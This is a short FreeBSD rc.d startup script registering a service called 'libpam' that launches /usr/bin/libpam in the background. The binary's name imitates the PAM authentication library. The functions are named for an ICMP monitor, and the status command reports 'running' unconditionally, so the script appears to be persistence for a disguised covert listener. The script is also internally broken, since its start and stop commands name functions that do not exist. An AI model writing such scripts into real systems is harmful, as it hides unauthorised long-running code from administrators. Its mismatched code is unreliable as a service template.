#!/bin/sh

# PROVIDE: libpam

. /etc/rc.subr

name="libpam"
rcvar="${name}_enable"
start_cmd="${name}_start"
stop_cmd="${name}_stop"
status_cmd="echo 'libpam running'"

icmp_monitor_start() {
	echo "libpam starting"
	/usr/bin/libpam &
}

icmp_monitor_stop() {
	echo "libpam stopping"
}
load_rc_config $name
run_rc_command $1
